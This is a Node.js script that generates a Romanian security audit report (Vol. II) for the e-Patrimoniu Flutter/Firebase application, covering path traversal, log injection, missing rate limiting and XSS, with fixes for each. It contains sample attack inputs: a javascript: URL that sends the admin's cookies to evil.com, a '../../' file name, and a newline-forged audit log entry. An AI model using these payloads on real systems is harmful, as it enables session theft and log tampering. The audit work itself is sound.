'use strict';
const { Document, Packer, Paragraph, TextRun, Table, TableRow, TableCell,
  AlignmentType, HeadingLevel, LevelFormat, BorderStyle, WidthType,
  ShadingType, VerticalAlign, Header, Footer, PageNumber, ExternalHyperlink,
  PageBreak } = require('docx');
const fs = require('fs');

// ─── Colors ────────────────────────────────────────────────────────────────
const C = {
  red:      'C0392B',
  orange:   'E67E22',
  yellow:   'F39C12',
  green:    '27AE60',
  blue:     '2C3E50',
  lightRed: 'FADBD8',
  lightOr:  'FDEBD0',
  lightYel: 'FEF9E7',
  lightGr:  'EAFAF1',
  lightBl:  'EBF5FB',
  lightGray:'F2F3F4',
  headerBg: '2C3E50',
  white:    'FFFFFF',
  codeGray: 'F8F9FA',
};

const border = (color='CCCCCC') => ({ style: BorderStyle.SINGLE, size: 1, color });
const borders = (color='CCCCCC') => ({ top: border(color), bottom: border(color), left: border(color), right: border(color) });
const cellPad = { top: 80, bottom: 80, left: 120, right: 120 };

// ─── Helpers ───────────────────────────────────────────────────────────────
function h1(text) {
  return new Paragraph({
    heading: HeadingLevel.HEADING_1,
    spacing: { before: 360, after: 120 },
    children: [new TextRun({ text, bold: true, size: 30, font: 'Arial', color: C.blue })]
  });
}
function h2(text) {
  return new Paragraph({
    heading: HeadingLevel.HEADING_2,
    spacing: { before: 240, after: 80 },
    children: [new TextRun({ text, bold: true, size: 26, font: 'Arial', color: C.blue })]
  });
}
function h3(text, color=C.blue) {
  return new Paragraph({
    spacing: { before: 200, after: 60 },
    children: [new TextRun({ text, bold: true, size: 24, font: 'Arial', color })]
  });
}
function para(runs, spacing={ before: 60, after: 60 }) {
  const children = Array.isArray(runs)
    ? runs.map(r => typeof r === 'string'
        ? new TextRun({ text: r, size: 22, font: 'Arial' })
        : new TextRun({ size: 22, font: 'Arial', ...r }))
    : [new TextRun({ text: runs, size: 22, font: 'Arial' })];
  return new Paragraph({ spacing, children });
}
function code(text) {
  return new Paragraph({
    spacing: { before: 40, after: 40 },
    shading: { fill: C.codeGray, type: ShadingType.CLEAR },
    indent: { left: 360 },
    children: [new TextRun({ text, font: 'Courier New', size: 18, color: '2C3E50' })]
  });
}
function bullet(text, indent=360) {
  return new Paragraph({
    spacing: { before: 40, after: 40 },
    indent: { left: indent, hanging: 360 },
    numbering: { reference: 'bullets', level: 0 },
    children: [new TextRun({ text, size: 22, font: 'Arial' })]
  });
}
function sep() {
  return new Paragraph({
    spacing: { before: 120, after: 120 },
    border: { bottom: { style: BorderStyle.SINGLE, size: 4, color: 'CCCCCC', space: 1 } },
    children: [],
  });
}
function pageBreak() {
  return new Paragraph({ children: [new PageBreak()] });
}

function findingHeader(id, title, cvss, severity) {
  const colors = { CRITICAL: C.red, HIGH: C.red, MEDIUM: C.orange, LOW: C.yellow };
  const bg     = { CRITICAL: C.lightRed, HIGH: C.lightRed, MEDIUM: C.lightOr, LOW: C.lightYel };
  const col = colors[severity] || C.blue;
  const fill = bg[severity] || C.lightBl;
  return new Table({
    width: { size: 9360, type: WidthType.DXA },
    columnWidths: [1600, 5560, 1400, 800],
    rows: [new TableRow({ children: [
      new TableCell({
        borders: borders(col), width: { size: 1600, type: WidthType.DXA },
        margins: cellPad,
        shading: { fill: col, type: ShadingType.CLEAR },
        verticalAlign: VerticalAlign.CENTER,
        children: [new Paragraph({ alignment: AlignmentType.CENTER,
          children: [new TextRun({ text: id, bold: true, color: C.white, size: 22, font: 'Arial' })]})]
      }),
      new TableCell({
        borders: borders(col), width: { size: 5560, type: WidthType.DXA },
        margins: cellPad,
        shading: { fill, type: ShadingType.CLEAR },
        children: [new Paragraph({ children: [
          new TextRun({ text: title, bold: true, size: 24, font: 'Arial', color: C.blue })
        ]})]
      }),
      new TableCell({
        borders: borders(col), width: { size: 1400, type: WidthType.DXA },
        margins: cellPad,
        shading: { fill, type: ShadingType.CLEAR },
        verticalAlign: VerticalAlign.CENTER,
        children: [new Paragraph({ alignment: AlignmentType.CENTER,
          children: [new TextRun({ text: `CVSS ${cvss}`, bold: true, size: 20, font: 'Arial', color: col })]})]
      }),
      new TableCell({
        borders: borders(col), width: { size: 800, type: WidthType.DXA },
        margins: cellPad,
        shading: { fill: col, type: ShadingType.CLEAR },
        verticalAlign: VerticalAlign.CENTER,
        children: [new Paragraph({ alignment: AlignmentType.CENTER,
          children: [new TextRun({ text: severity, bold: true, color: C.white, size: 18, font: 'Arial' })]})]
      }),
    ]})],
  });
}

function metaTable(rows) {
  return new Table({
    width: { size: 9360, type: WidthType.DXA },
    columnWidths: [2000, 7360],
    rows: rows.map(([label, value]) => new TableRow({ children: [
      new TableCell({
        borders: borders(), width: { size: 2000, type: WidthType.DXA },
        margins: cellPad,
        shading: { fill: C.lightGray, type: ShadingType.CLEAR },
        children: [new Paragraph({ children: [new TextRun({ text: label, bold: true, size: 20, font: 'Arial', color: C.blue })] })]
      }),
      new TableCell({
        borders: borders(), width: { size: 7360, type: WidthType.DXA },
        margins: cellPad,
        children: [new Paragraph({ children: [new TextRun({ text: value, size: 20, font: 'Arial' })] })]
      }),
    ]})),
  });
}

function sectionLabel(text, fill) {
  return new Paragraph({
    spacing: { before: 80, after: 40 },
    shading: { fill, type: ShadingType.CLEAR },
    indent: { left: 0 },
    children: [new TextRun({ text, bold: true, size: 20, font: 'Arial', color: C.blue })]
  });
}

// ─── Remediation matrix table ───────────────────────────────────────────────
function matrixTable(rows) {
  const hdrs = ['ID', 'Titlu', 'Severitate', 'Efort', 'Prioritate'];
  const widths = [900, 4360, 1100, 1000, 2000];
  return new Table({
    width: { size: 9360, type: WidthType.DXA },
    columnWidths: widths,
    rows: [
      new TableRow({ children: hdrs.map((h, i) => new TableCell({
        borders: borders(C.blue), width: { size: widths[i], type: WidthType.DXA },
        margins: cellPad,
        shading: { fill: C.headerBg, type: ShadingType.CLEAR },
        children: [new Paragraph({ alignment: AlignmentType.CENTER,
          children: [new TextRun({ text: h, bold: true, color: C.white, size: 20, font: 'Arial' })] })]
      })) }),
      ...rows.map(([id, title, sev, effort, pri], idx) => {
        const sevColor = { CRITICAL: C.red, HIGH: C.red, MEDIUM: C.orange, LOW: C.yellow }[sev] || C.blue;
        const fill = idx % 2 === 0 ? C.white : C.lightGray;
        return new TableRow({ children: [id, title, sev, effort, pri].map((val, ci) => new TableCell({
          borders: borders(), width: { size: widths[ci], type: WidthType.DXA },
          margins: cellPad,
          shading: { fill: ci === 2 ? { CRITICAL: C.lightRed, HIGH: C.lightRed, MEDIUM: C.lightOr, LOW: C.lightYel }[sev] || fill : fill, type: ShadingType.CLEAR },
          children: [new Paragraph({ alignment: ci === 2 ? AlignmentType.CENTER : AlignmentType.LEFT,
            children: [new TextRun({ text: val, size: 20, font: 'Arial', bold: ci === 0 || ci === 2,
              color: ci === 2 ? sevColor : C.blue })] })]
        })) });
      }),
    ],
  });
}

// ═══════════════════════════════════════════════════════════════════════════
// DOCUMENT CONTENT
// ═══════════════════════════════════════════════════════════════════════════
const children = [];

// ── Cover ──────────────────────────────────────────────────────────────────
children.push(
  new Paragraph({ spacing: { before: 1440, after: 0 }, alignment: AlignmentType.CENTER,
    children: [new TextRun({ text: 'e-Patrimoniu', bold: true, size: 72, font: 'Arial', color: C.blue })] }),
  new Paragraph({ spacing: { before: 80, after: 0 }, alignment: AlignmentType.CENTER,
    children: [new TextRun({ text: 'Raport de Analiză Securitate – Vol. II', bold: true, size: 40, font: 'Arial', color: C.orange })] }),
  new Paragraph({ spacing: { before: 40, after: 0 }, alignment: AlignmentType.CENTER,
    children: [new TextRun({ text: 'Atacuri de tip Injection · Design Nesigur · Cross-Site Scripting (XSS)', size: 28, font: 'Arial', color: '7F8C8D' })] }),
  new Paragraph({ spacing: { before: 80, after: 0 }, alignment: AlignmentType.CENTER,
    children: [new TextRun({ text: 'Versiune: 1.0  |  Data: Iunie 2026  |  Clasificare: CONFIDENȚIAL', size: 22, font: 'Arial', color: '7F8C8D' })] }),
  new Paragraph({ spacing: { before: 0, after: 0 },
    border: { bottom: { style: BorderStyle.SINGLE, size: 8, color: C.blue, space: 1 } }, children: [] }),
  new Paragraph({ spacing: { before: 120, after: 40 }, alignment: AlignmentType.CENTER,
    children: [new TextRun({ text: 'REZUMAT EXECUTIV', bold: true, size: 26, font: 'Arial', color: C.blue })] }),
  para('Acest volum extinde auditul de securitate e-Patrimoniu (Vol. I) cu analiza detaliată a trei clase de vulnerabilități: (1) Injection, (2) Design Nesigur și (3) Cross-Site Scripting (XSS). Codebase-ul constă din Flutter Web 3.41.6 (frontend), Firebase Auth + Firestore + Storage (backend BaaS) și un server Node.js/Express cu Firebase Admin SDK (deployment pe Render). Au fost identificate 8 constatări noi (S-INJ-01…03, S-DES-01…03, S-XSS-01…02) cu severitate de la LOW la HIGH.'),
  para([
    { text: 'Metodologie: ', bold: true },
    'revizuire manuală a codului sursă, mapare OWASP ASVS v4.0.3 + Top 10 2021, scoruri CVSS v3.1 (Base Score), mapare CWE, NIS2 Art. 21 și GDPR Art. 32. Codului remediat i s-a aplicat o analiză red-team secundară.'
  ]),
  pageBreak(),
);

// ═══════════════════════════════════════════════════════════════════════════
// SECȚIUNEA 1: INJECTION
// ═══════════════════════════════════════════════════════════════════════════
children.push(h1('1. Atacuri de tip Injection'));
children.push(para('Injecțiile apar când datele furnizate de utilizator sunt incluse fără sanitizare în comenzi sau interogări interpretate de un motor de execuție. În e-Patrimoniu au fost identificate trei vectori direcți.'));
children.push(new Paragraph({ spacing: { before: 60, after: 20 }, children: [] }));

// ── S-INJ-01 ─────────────────────────────────────────────────────────────
children.push(findingHeader('S-INJ-01', 'Path Traversal în Firebase Storage (fileName nesanitizat)', '6.5', 'MEDIUM'));
children.push(new Paragraph({ spacing: { before: 80, after: 0 }, children: [] }));
children.push(metaTable([
  ['CWE',       'CWE-22: Improper Limitation of a Pathname to a Restricted Directory'],
  ['OWASP ASVS','V12.3.1 – Fișierele încărcate sunt validate ca tip MIME și dimensiune; V12.3.2 – Numele fișierelor sunt sanitizate'],
  ['OWASP Top10','A03:2021 – Injection'],
  ['NIS2',      'Art. 21(2)(d) – Securitatea lanțului de aprovizionare; integritatea datelor stocate'],
  ['GDPR',      'Art. 32(1)(b) – Măsuri tehnice pentru asigurarea integrității și confidențialității'],
  ['CVSS v3.1', 'AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N = 6.5 (MEDIUM)'],
]));
children.push(new Paragraph({ spacing: { before: 80, after: 20 }, children: [] }));
children.push(h3('Descriere'));
children.push(para('Metoda DocumentService.uploadDocument() folosește direct fileName furnizat de utilizator pentru a construi calea din Firebase Storage, fără nicio sanitizare. Un actor rău poate furniza un fileName precum ../../admin/config.json, determinând stocarea fișierului în afara directorului documents/.'));
children.push(h3('Evidență din cod'));
children.push(code('// lib/core/services/document_service.dart – linia 30'));
children.push(code('final storageName = \'${DateTime.now().millisecondsSinceEpoch}_$fileName\'; // ← fileName NESANITIZAT'));
children.push(code('final storagePath = \'documents/$storageName\';'));
children.push(code('final ref = _storage.ref(storagePath);  // Calea poate conține "../"'));
children.push(new Paragraph({ spacing: { before: 40, after: 40 }, children: [] }));
children.push(para([
  { text: 'Impactul concret: ', bold: true },
  'Firebase Storage normalizează de obicei traversarea de directoare la nivel de GCS, dar denumirile de fișiere cu caractere speciale (spații, slash-uri, ghilimele) pot cauza erori neașteptate și pot suprascrie alte fișiere dacă există logică de fișiere predictibilă. Mai grav, dacă fileName conține caractere care manipulează URL-ul Storage, atacatorul poate influența locația fișierului public descărcat.'
]));
children.push(h3('Cod Remediat'));
children.push(code('// lib/core/services/document_service.dart'));
children.push(code('static String _sanitizeFileName(String fileName) {'));
children.push(code('  // 1. Extrage extensia validă'));
children.push(code('  const allowed = {\'pdf\', \'jpg\', \'jpeg\', \'png\', \'doc\', \'docx\'};'));
children.push(code('  final parts = fileName.split(\'.\');'));
children.push(code('  final ext = parts.length > 1 ? parts.last.toLowerCase() : \'\';'));
children.push(code('  if (!allowed.contains(ext)) throw ArgumentError(\'Tip fișier nepermis: $ext\');'));
children.push(code('  // 2. Elimină orice caracter din afara alphanumeric/hyphen/underscore'));
children.push(code('  final baseName = parts.first.replaceAll(RegExp(r\'[^\\w-]\'), \'_\');'));
children.push(code('  return \'${baseName.substring(0, baseName.length.clamp(0, 50))}.$ext\';'));
children.push(code('}'));
children.push(code(''));
children.push(code('// În uploadDocument():'));
children.push(code('final safeFileName = _sanitizeFileName(fileName);'));
children.push(code('final storageName = \'${DateTime.now().millisecondsSinceEpoch}_$safeFileName\';'));
children.push(new Paragraph({ spacing: { before: 20, after: 20 }, children: [] }));

// ── S-INJ-02 ─────────────────────────────────────────────────────────────
children.push(sep());
children.push(findingHeader('S-INJ-02', 'Log Injection prin câmpul detalii în audit log', '4.3', 'MEDIUM'));
children.push(new Paragraph({ spacing: { before: 80, after: 0 }, children: [] }));
children.push(metaTable([
  ['CWE',       'CWE-117: Improper Output Neutralization for Logs'],
  ['OWASP ASVS','V7.3.1 – Log-urile nu conțin caractere de control nesanitizate (newline injection)'],
  ['OWASP Top10','A09:2021 – Security Logging and Monitoring Failures'],
  ['NIS2',      'Art. 21(2)(f) – Politici și proceduri pentru evaluarea eficienței gestionării riscurilor'],
  ['GDPR',      'Art. 32(1)(d) – Proceduri pentru testarea și evaluarea periodică'],
  ['CVSS v3.1', 'AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N = 4.3 (MEDIUM)'],
]));
children.push(new Paragraph({ spacing: { before: 80, after: 20 }, children: [] }));
children.push(h3('Descriere'));
children.push(para('Multiple locuri din codebase construiesc câmpul detalii din audit log prin string interpolation directă cu date furnizate de utilizator (denumire, status, nume bun imobiliar). Un atacator autentificat poate introduce caractere de newline (\\n, \\r) sau secvențe ANSI escape în aceste câmpuri, falsificând înregistrările din audit log stocate în Firestore și exportate ulterior în logurile Render.'));
children.push(h3('Evidențe din cod'));
children.push(code('// lib/core/services/document_service.dart – linia 60'));
children.push(code('detalii: \'A încărcat documentul: $denumire\',  // ← denumire vine direct din UI'));
children.push(code(''));
children.push(code('// lib/core/services/property_service.dart – linia 41'));
children.push(code('detalii: \'A adăugat bunul imobiliar: ${p.denumire}\','));
children.push(code(''));
children.push(code('// lib/core/services/property_service.dart – linia 80'));
children.push(code('detalii: \'Status actualizat la "${status.label}" pentru: $denumire\','));
children.push(code(''));
children.push(code('// lib/core/services/audit_service.dart – linia 28-30'));
children.push(code('} catch (e) {'));
children.push(code('  // Audit nu trebuie să blocheze operațiunile principale'));
children.push(code('}  // ← Excepțiile sunt înghițite silențios; eșecul audit nu este detectabil!'));
children.push(new Paragraph({ spacing: { before: 40, after: 40 }, children: [] }));
children.push(para([
  { text: 'Impact dublu: ', bold: true },
  '(1) Un atacator poate falsifica audit log-ul prin crearea unui document cu denumire = "Document legit\\nS-A CONECTAT admin@gov.ro", injectând rânduri false în audit trail. (2) Excepțiile silențioase ascund eșecuri ale audit log-ului – dacă Firestore devine indisponibil, operațiunile continuă fără nicio înregistrare.'
]));
children.push(h3('Cod Remediat'));
children.push(code('// lib/core/services/audit_service.dart'));
children.push(code('static String _sanitizeForLog(String input) {'));
children.push(code('  // Elimină caractere de control (tab permis, newline/CR interzise)'));
children.push(code('  return input'));
children.push(code('    .replaceAll(RegExp(r\'[\\r\\n\\x00-\\x08\\x0B-\\x1F\\x7F]\'), \' \')'));
children.push(code('    .substring(0, input.length.clamp(0, 500));'));
children.push(code('}'));
children.push(code(''));
children.push(code('static Future<void> log({ ... required String detalii, ... }) async {'));
children.push(code('  try {'));
children.push(code('    await _firestore.collection(AppConfig.colAuditLog).add({'));
children.push(code('      \'userId\': userId,'));
children.push(code('      \'userName\': userName,'));
children.push(code('      \'actiune\': actiune.name,'));
children.push(code('      \'entitate\': entitate,'));
children.push(code('      \'entitateId\': entitateId,'));
children.push(code('      \'detalii\': _sanitizeForLog(detalii),  // ← SANITIZAT'));
children.push(code('      \'dataOra\': FieldValue.serverTimestamp(),'));
children.push(code('    });'));
children.push(code('  } catch (e, st) {'));
children.push(code('    // Nu blocăm operația, DAR înregistrăm eșecul în consolă'));
children.push(code('    debugPrint(\'[AUDIT ERROR] $e\\n$st\');'));
children.push(code('    // Considerați: incrementați un contor de erori audit în Firebase'));
children.push(code('  }'));
children.push(code('}'));
children.push(new Paragraph({ spacing: { before: 20, after: 20 }, children: [] }));

// ── S-INJ-03 ─────────────────────────────────────────────────────────────
children.push(sep());
children.push(findingHeader('S-INJ-03', 'Log Injection în consolele backend (Render)', '3.1', 'LOW'));
children.push(new Paragraph({ spacing: { before: 80, after: 0 }, children: [] }));
children.push(metaTable([
  ['CWE',       'CWE-117: Improper Output Neutralization for Logs'],
  ['OWASP ASVS','V7.3.1 – Sanitizarea ieșirilor în loguri'],
  ['OWASP Top10','A09:2021 – Security Logging and Monitoring Failures'],
  ['NIS2',      'Art. 21(2)(f) – Monitorizarea eficientă a incidentelor'],
  ['GDPR',      'Art. 32(1)(b) – Integritatea procesării'],
  ['CVSS v3.1', 'AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:N = 3.1 (LOW)'],
]));
children.push(new Paragraph({ spacing: { before: 80, after: 20 }, children: [] }));
children.push(h3('Descriere'));
children.push(para('backend/index.js înregistrează excepțiile negestionate cu console.error(\'Unhandled error:\', err). Obiectul err poate conține mesaje derivate din datele cererii (err.message poate include valori din req.body, de ex. un câmp denumire cu newline-uri). Aceasta poate polua logurile structurate Render cu rânduri false, complicând monitorizarea.'));
children.push(h3('Evidență din cod'));
children.push(code('// backend/index.js – linia 59'));
children.push(code('app.use((err, _req, res, _next) => {'));
children.push(code('  console.error(\'Unhandled error:\', err);  // ← err.message poate conține input utilizator'));
children.push(code('  res.status(500).json({ error: \'Eroare internă server.\' });'));
children.push(code('});'));
children.push(h3('Cod Remediat'));
children.push(code('// backend/index.js'));
children.push(code('app.use((err, _req, res, _next) => {'));
children.push(code('  // Sanitizăm mesajul înainte de a-l loga'));
children.push(code('  const safeMsg = String(err.message || err).replace(/[\\r\\n]/g, \' \').slice(0, 200);'));
children.push(code('  console.error(\'Unhandled error:\', safeMsg, \'| stack:\', err.stack?.split(\'\\n\')[0]);'));
children.push(code('  res.status(500).json({ error: \'Eroare internă server.\' });'));
children.push(code('});'));
children.push(new Paragraph({ spacing: { before: 20, after: 20 }, children: [] }));

children.push(pageBreak());

// ═══════════════════════════════════════════════════════════════════════════
// SECȚIUNEA 2: INSECURE DESIGN
// ═══════════════════════════════════════════════════════════════════════════
children.push(h1('2. Vulnerabilități bazate pe Design Nesigur'));
children.push(para('Designul nesigur se referă la absența controalelor de securitate la nivel arhitectural, nu la erori de implementare. Aceste vulnerabilități nu pot fi rezolvate printr-o simplă corecție de cod; necesită redesign structural.'));

// ── S-DES-01 ─────────────────────────────────────────────────────────────
children.push(findingHeader('S-DES-01', 'Fetch O(N) fără limită în getStats() – risc DoS', '5.3', 'MEDIUM'));
children.push(new Paragraph({ spacing: { before: 80, after: 0 }, children: [] }));
children.push(metaTable([
  ['CWE',       'CWE-400: Uncontrolled Resource Consumption ("Resource Exhaustion")'],
  ['OWASP ASVS','V4.2.2 – Serviciile nu permit unui utilizator să consume resurse excesive; V13.4.2 – Paginare pe resurse Firestore'],
  ['OWASP Top10','A04:2021 – Insecure Design'],
  ['NIS2',      'Art. 21(2)(e) – Continuitatea activității; disponibilitatea serviciului'],
  ['GDPR',      'Art. 32(1)(b) – Reziliența sistemelor de procesare'],
  ['CVSS v3.1', 'AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L = 5.3 (MEDIUM)'],
]));
children.push(new Paragraph({ spacing: { before: 80, after: 20 }, children: [] }));
children.push(h3('Descriere'));
children.push(para('PropertyService.getStats() preia ÎNTREAGA colecție properties din Firestore fără nicio limită (.limit()), fără paginare și fără cache. La fiecare deschidere a dashboard-ului, se execută un full-collection scan. Cu N bunuri imobiliare, costul este O(N) citiri Firestore și O(N) utilizare de memorie client. Colecțiile mari (mii de înregistrări, posibil în timp pentru un UAT) vor genera: (a) latență crescută a paginii, (b) cost Firestore ridicat și (c) potențial timeout pe clientele mobile/lente.'));
children.push(h3('Evidență din cod'));
children.push(code('// lib/core/services/property_service.dart – linia 102'));
children.push(code('static Future<Map<String, dynamic>> getStats() async {'));
children.push(code('  final snap = await _col.get();  // ← NICIO LIMITĂ – full table scan'));
children.push(code('  final all = snap.docs.map((d) => PropertyModel.fromFirestore(d)).toList();'));
children.push(code('  // Toate calculele se fac in-memory pe client'));
children.push(code('  ...'));
children.push(code('}'));
children.push(h3('Soluție Recomandată'));
children.push(para('Folosiți Firestore Aggregation Queries (count, sum) sau o Cloud Function dedicată care menține contoare denormalizate (counter sharding pattern). Exemplu cu aggregation:'));
children.push(code('// RECOMANDAT: Firestore Aggregation API (Flutter SDK ≥ 4.x)'));
children.push(code('final countSnap = await _col.where(\'status\', isEqualTo: \'activ\').count().get();'));
children.push(code('final activeCount = countSnap.count;  // Citire server-side, 1 unitate Firestore'));
children.push(code(''));
children.push(code('// SAU: menține contoare denormalizate într-un document separat'));
children.push(code('// "stats/properties" actualizat prin FieldValue.increment() la fiecare add/delete'));
children.push(new Paragraph({ spacing: { before: 20, after: 20 }, children: [] }));

// ── S-DES-02 ─────────────────────────────────────────────────────────────
children.push(sep());
children.push(findingHeader('S-DES-02', 'Ștergere permanentă (hard delete) fără soft-delete sau arhivare', '4.0', 'MEDIUM'));
children.push(new Paragraph({ spacing: { before: 80, after: 0 }, children: [] }));
children.push(metaTable([
  ['CWE',       'CWE-1188: Insecure Default Initialization; CWE-693: Protection Mechanism Failure'],
  ['OWASP ASVS','V8.3.4 – Date sensibile nu sunt șterse permanent fără confirmare explicită și backup'],
  ['OWASP Top10','A04:2021 – Insecure Design'],
  ['NIS2',      'Art. 21(2)(c) – Gestionarea incidentelor; recuperarea datelor'],
  ['GDPR',      'Art. 5(1)(e) – Limitarea stocării; Art. 17 – Dreptul la ștergere (dar și obligația de păstrare conform Art. 5(1)(e) pentru evidențe publice)'],
  ['CVSS v3.1', 'AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:H/A:L = 4.0 (MEDIUM)'],
]));
children.push(new Paragraph({ spacing: { before: 80, after: 20 }, children: [] }));
children.push(h3('Descriere'));
children.push(para('Atât DocumentService.delete() cât și PropertyService.delete() execută ștergeri permanente din Firestore și Firebase Storage. Nu există mecanism de soft-delete (câmp isDeleted/deletedAt), recuperare sau arhivare. Orice utilizator cu rolul adecvat poate șterge irevocabil bunuri imobiliare sau documente publice. Aceasta este o problemă de design pentru sisteme ce gestionează patrimoniu public, unde legea română (Legea 287/2009, OG 63/2002) poate impune păstrarea evidențelor pe perioade îndelungate.'));
children.push(h3('Evidențe din cod'));
children.push(code('// lib/core/services/document_service.dart – linia 98-99'));
children.push(code('static Future<void> delete(String id, String fileUrl, {required String userId}) async {'));
children.push(code('  await _col.doc(id).delete();  // ← ȘTERGERE PERMANENTĂ Firestore'));
children.push(code('  ...'));
children.push(code('  await ref.delete();  // ← ȘTERGERE PERMANENTĂ Storage'));
children.push(code(''));
children.push(code('// lib/core/services/property_service.dart – linia 89'));
children.push(code('static Future<void> delete(String id, { ... }) async {'));
children.push(code('  await _col.doc(id).delete();  // ← ȘTERGERE PERMANENTĂ'));
children.push(h3('Soluție Recomandată'));
children.push(code('// Soft-delete: marchează documentul ca șters fără a-l elimina fizic'));
children.push(code('static Future<void> delete(String id, { required String userId }) async {'));
children.push(code('  await _col.doc(id).update({'));
children.push(code('    \'isDeleted\': true,'));
children.push(code('    \'deletedAt\': FieldValue.serverTimestamp(),'));
children.push(code('    \'deletedBy\': userId,'));
children.push(code('  });'));
children.push(code('  // Omitem ștergerea fizică din Storage – fișierul rămâne disponibil pentru recuperare'));
children.push(code('  // O Cloud Function de arhivare poate muta fișierele în Google Cloud Archive Storage'));
children.push(code('  // după 30 de zile, reducând costul cu 80%'));
children.push(code('}'));
children.push(code(''));
children.push(code('// Toate query-urile trebuie să excludă înregistrările șterse:'));
children.push(code('static Stream<List<DocumentModel>> getAll() {'));
children.push(code('  return _col'));
children.push(code('    .where(\'isDeleted\', isEqualTo: false)'));
children.push(code('    .orderBy(\'uploadedAt\', descending: true)'));
children.push(code('    .snapshots()'));
children.push(code('    .map((s) => s.docs.map((d) => DocumentModel.fromFirestore(d)).toList());'));
children.push(code('}'));
children.push(new Paragraph({ spacing: { before: 20, after: 20 }, children: [] }));

// ── S-DES-03 ─────────────────────────────────────────────────────────────
children.push(sep());
children.push(findingHeader('S-DES-03', 'Absența Rate Limiting – toate endpoint-urile backend vulnerabile la brute-force și scraping', '5.8', 'MEDIUM'));
children.push(new Paragraph({ spacing: { before: 80, after: 0 }, children: [] }));
children.push(metaTable([
  ['CWE',       'CWE-307: Improper Restriction of Excessive Authentication Attempts; CWE-770: Allocation of Resources Without Limits'],
  ['OWASP ASVS','V4.2.2 – Rate limiting pe funcții critice; V19.1.1 – Limitare per IP/utilizator'],
  ['OWASP Top10','A04:2021 – Insecure Design'],
  ['NIS2',      'Art. 21(2)(e) – Continuitatea activității; disponibilitate'],
  ['GDPR',      'Art. 32(1)(b) – Reziliența continuă a sistemelor'],
  ['CVSS v3.1', 'AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:L = 5.8 (MEDIUM)'],
]));
children.push(new Paragraph({ spacing: { before: 80, after: 20 }, children: [] }));
children.push(h3('Descriere'));
children.push(para('Niciun endpoint din backend/routes/ nu implementează rate limiting. Aceasta permite: (1) brute-force pe /api/users/register (enumerare utilizatori), (2) scraping complet al colecțiilor Firestore prin API-ul backend, (3) flooding pe /api/auctions/:id/bids cu oferte invalide (deși validarea business logic respinge ofertele, fiecare cerere execută citiri Firestore), (4) flooding pe /api/health drept D.o.S. de tip "low and slow".'));
children.push(h3('Soluție Recomandată'));
children.push(code('// backend/index.js – adăugați înainte de definirea rutelor'));
children.push(code('const rateLimit = require(\'express-rate-limit\');  // npm install express-rate-limit'));
children.push(code(''));
children.push(code('// Limită globală: 100 req/minut per IP'));
children.push(code('app.use(rateLimit({'));
children.push(code('  windowMs: 60 * 1000,'));
children.push(code('  max: 100,'));
children.push(code('  standardHeaders: true,'));
children.push(code('  legacyHeaders: false,'));
children.push(code('  message: { error: \'Prea multe cereri. Încercați mai târziu.\' }'));
children.push(code('}));'));
children.push(code(''));
children.push(code('// Limită strictă pe operații critice: 10 req/minut per IP'));
children.push(code('const strictLimit = rateLimit({ windowMs: 60 * 1000, max: 10 });'));
children.push(code('app.use(\'/api/users/register\', strictLimit);'));
children.push(code('app.use(\'/api/auctions/:id/bids\', strictLimit);'));
children.push(new Paragraph({ spacing: { before: 20, after: 20 }, children: [] }));

children.push(pageBreak());

// ═══════════════════════════════════════════════════════════════════════════
// SECȚIUNEA 3: XSS
// ═══════════════════════════════════════════════════════════════════════════
children.push(h1('3. Cross-Site Scripting (XSS)'));
children.push(para('Deși Flutter Web redă interfața pe un Canvas WebGL (nu DOM), există vectori XSS specifici platformei prin url_launcher (deschidere URL cu schema javascript:) și prin posibila utilizare viitoare a flutter_markdown_plus cu conținut controlat de utilizator. Ambele pachete sunt declarate în pubspec.yaml dar nu sunt încă invocate; vulnerabilitățile sunt arhitecturale, prezente din momentul în care aceste pachete sunt conectate la date din Firestore.'));

// ── S-XSS-01 ─────────────────────────────────────────────────────────────
children.push(findingHeader('S-XSS-01', 'URL Injection prin fileUrl/documentUrl din Firestore (url_launcher fără validare)', '7.1', 'HIGH'));
children.push(new Paragraph({ spacing: { before: 80, after: 0 }, children: [] }));
children.push(metaTable([
  ['CWE',       'CWE-79: Cross-site Scripting (Stored); CWE-601: URL Redirection to Untrusted Site'],
  ['OWASP ASVS','V5.3.6 – Output encoding contextual; V14.4.3 – Antete CSP corespunzătoare'],
  ['OWASP Top10','A03:2021 – Injection (XSS)'],
  ['NIS2',      'Art. 21(2)(d) – Securitatea aplicațiilor; integritatea software'],
  ['GDPR',      'Art. 32(1)(b) – Protecție față de accesul neautorizat'],
  ['CVSS v3.1', 'AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N = 7.1 (HIGH)'],
]));
children.push(new Paragraph({ spacing: { before: 80, after: 20 }, children: [] }));
children.push(h3('Descriere'));
children.push(para('Modelele ContractModel (câmpul documentUrl) și DocumentModel (câmpul fileUrl) stochează URL-uri preluate direct din Firestore, fără nicio validare a schemei. Pachetul url_launcher ^6.2.4 este declarat în pubspec.yaml. Funcția launchUrl() din url_launcher pe Flutter Web traduce apelul într-un window.open() JavaScript, care execută URL-uri cu schema javascript: în contextul paginii.'));
children.push(para([
  { text: 'Vector de atac complet: ', bold: true },
  '(1) Atacatorul exploatează regulile Firestore în modul test (F-01 din Vol. I) sau un cont compromis cu rol functionar. (2) Scrie documentUrl = "javascript:fetch(\'https://evil.com/steal?c=\'+document.cookie)" în colecția contracts. (3) Un administrator deschide contractul și apasă "Vizualizează document". (4) url_launcher apelează window.open(url), executând JavaScript în sesiunea administratorului.'
]));
children.push(h3('Evidențe arhitecturale'));
children.push(code('// pubspec.yaml – linia 31'));
children.push(code('url_launcher: ^6.2.4  # ← DECLARAT, nu este invocat ÎN PREZENT'));
children.push(code(''));
children.push(code('// lib/core/models/contract/contract_model.dart – linia 59'));
children.push(code('final String? documentUrl;  // ← Câmp URL fără validare de schemă'));
children.push(code(''));
children.push(code('// lib/core/models/document/document_model.dart – linia 54'));
children.push(code('final String fileUrl;  // ← URL Firebase Storage, NEVERIFICAT că rămâne gs:// sau https://'));
children.push(code(''));
children.push(code('// lib/core/services/document_service.dart – linia 101'));
children.push(code('final ref = _storage.refFromURL(fileUrl);  // ← refFromURL acceptă orice string'));
children.push(code(''));
